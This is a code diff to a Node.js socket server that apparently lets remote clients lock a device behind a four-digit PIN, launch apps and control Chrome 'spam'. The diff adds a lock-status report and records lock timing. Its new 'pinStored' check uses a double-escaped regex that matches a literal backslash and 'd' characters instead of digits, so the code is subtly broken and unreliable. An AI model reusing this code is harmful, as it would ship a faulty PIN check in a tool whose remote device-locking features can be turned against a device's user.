@@ -261,6 +261,17 @@ const server = net.createServer(socket => {
       : data.type === 'open_app' ? 'launch'
       : data.type;
 
+    if (action === 'lock_status') {
+      send(socket, {
+        type: 'lock_status_result',
+        active: lockState.active === true,
+        intervalSeconds: Number(lockState.intervalSeconds) || 4,
+        durationMinutes: Number(lockState.durationMinutes) || 5,
+        pinStored: /^\\d{4}$/.test(LOCK_PIN)
+      });
+      return;
+    }
+
     if (action === 'lock') {
       const requestedPin = String(data.pin || '');
       if (!/^\d{4}$/.test(requestedPin)) {
@@ -279,7 +290,10 @@ const server = net.createServer(socket => {
       const durationMs = durationMinutes * 60 * 1000;
       lockState = {
         active: true,
-        message: String(data.message || 'Lock Device aktif.').slice(0, 500)
+        message: String(data.message || 'Lock Device aktif.').slice(0, 500),
+        intervalSeconds,
+        durationMinutes,
+        startedAt: Date.now()
       };
       stopChromeSpam();
       const autoEffects = data.autoEffects === true;
